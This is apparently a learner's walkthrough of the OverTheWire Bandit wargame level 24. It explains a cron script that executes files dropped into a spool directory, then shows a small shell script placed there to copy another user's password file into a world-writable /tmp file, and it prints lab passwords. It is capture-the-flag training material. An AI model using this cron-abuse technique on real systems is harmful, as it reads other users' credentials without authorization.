# ![](https://overthewire.org/img/domokitten.png)

# Bandit_Level24

## Source:
- [Bandit_Level24] - The topic of Bandit, Level24.
- [Crontab] - Thoery about cron and cronjob.
### I. Connect:
```sh
ssh -p 2220 bandit23@bandit.labs.overthewire.org
Password: QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G
```
###
### II. My Solution:
- Simmilar to Level23, Read `cronjob_bandit24`: `cat cronjob_bandit24` -> Output:
```sh
@reboot bandit24 /usr/bin/cronjob_bandit24.sh  &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh  &> /dev/null
```

####
- Read `cronjob_bandit24.sh` : `cat /usr/bin/cronjob_bandit24.sh`
```sh
#!/bin/bash
myname=$(whoami)
cd /var/spool/$myname/foo || exit 1
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -rf ./$i
    fi
done
```
- When cronjob_bandit24.sh is run as user bandit24, myname="bandit24"
- Then `cd /var/spool/bandit24/foo`
- `for i in * .*;` : check all files in foo.
- `if [ "$i" != "." -a "$i" != ".." ];` : if $i or that file doesn't have name "." or "..".
- Then owner = user who own the file is being checked.
- If the owner == bandit23 then execute and delete that file.

####
- To pass this level:
  - Create a location in `/tmp` directory: mkdir /tmp/new_file
  - Change permission for it: chmod 777 /tmp/new_file
  - Get acess to `new_file`: `cd /tmp/new_file`.
  - Create two file: one is .sh file and another one is a normal text file: `touch pass` and `touch bandit24_run.sh`
  - Change permission for them: `chmod 777 pass` and `chmod 755 bandit24_run.sh`
  - Edit file bandit24_run.sh: `nano bandit24_run.sh`
  ```sh
  #!/bin/bash
  cat /etc/bandit_pass/bandit24 >&/tmp/new_file/pass #copy bandit24's password into file pass
  ```
  - Check again: `ls -la`
  ```sh
  total 10568
  drwxrwxrwx   2 bandit23 bandit23     4096 Aug 24 16:58 .
  drwxrwx-wt 297 root     root     10801152 Aug 24 17:15 ..
  -rwxr-xr-x   1 bandit23 bandit23       64 Aug 24 16:58 bandit24_run.sh
  -rwxrwxrwx   1 bandit23 bandit23       33 Aug 24 17:00 pass
  ```
  - Because "Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…"
  - So `cp bandit24_run.sh /var/spool/bandit24/foo/bandit24_run.sh`
  - Then, finally check the pass file: `cat /tmp/new_file/pass`

###
### III. Result:
Password for next level: `VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar`


[Bandit_Level24]: <https://overthewire.org/wargames/bandit/bandit22.html>
[Crontab]: <https://vietnix.vn/crontab/>